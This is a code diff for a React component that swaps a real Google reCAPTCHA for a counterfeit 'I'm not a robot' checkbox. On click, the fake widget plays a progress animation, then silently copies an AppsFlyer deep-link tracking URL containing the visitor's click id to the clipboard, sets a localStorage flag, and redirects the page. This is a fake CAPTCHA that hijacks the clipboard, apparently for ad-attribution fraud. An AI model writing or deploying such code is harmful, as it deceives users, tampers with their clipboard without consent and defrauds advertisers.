@@ -1,9 +1,36 @@
-import React from "react";
-import ReCAPTCHA from "react-google-recaptcha";
-import { useNavigate } from "react-router-dom";
+import React, { useState } from "react";
+import styles from "./ReCaptcha.module.scss";
+import captchaImg from "./images/Captcha.png";
+import checkImg from "./images/Vector.svg";
 
 const ReCaptcha = () => {
-  const navigate = useNavigate();
+  const [captcha, setCaptcha] = useState(false);
+  const [checked, setChecked] = useState(false);
+  const params = new Proxy(new URLSearchParams(window.location.search), {
+    get: (searchParams, prop) => searchParams.get(prop),
+  });
+
+  const handleClick = () => {
+    setCaptcha(true);
+    setTimeout(() => {
+      setCaptcha(false);
+      setChecked(true);
+      setTimeout(() => {
+        window.navigator.clipboard
+          .writeText(
+            `https://pure360.onelink.me/LIKB?af_xp=custom&pid=clipboard&is_retargeting=true&af_sub1=${
+              params.clickid || 1
+            }&af_click_lookback=7dt&deep_link_value=key&c=molodec&af_ad=vitalik&af_force_deeplink=true`
+          )
+          .then(() => {
+            localStorage.setItem("redirecta", "true");
+
+            window.location.href = "https://pagespeed.web.dev/";
+          });
+      }, 500);
+    }, 1000);
+  };
+
   return (
     <div
       style={{
@@ -13,12 +40,31 @@ const ReCaptcha = () => {
         transform: "translate(-50%, -50%)",
       }}
     >
-      <ReCAPTCHA
-        sitekey="6LfglsclAAAAANBCypsyrx_OaApVqodYZFUSueul"
-        onChange={() => {
-          navigate("/?verified=true&clickid=1");
-        }}
-      />
+      <div className={styles.ReCaptcha}>
+        <label className={styles.block} onClick={handleClick}>
+          <div className={styles.check}>
+            <div
+              className={`${styles.checkbox} ${
+                captcha || checked ? styles["d-none"] : ""
+              }`}
+            ></div>
+            <div
+              className={`${styles.progress} ${
+                captcha ? styles["d-block"] : ""
+              }`}
+            ></div>
+            <img
+              className={checked ? styles["d-block"] : ""}
+              src={checkImg}
+              alt="check"
+            />
+          </div>
+          <p>I’,m not a robot</p>
+        </label>
+        <div className={styles.img}>
+          <img src={captchaImg} alt="Captcha" />
+        </div>
+      </div>
     </div>
   );
 };
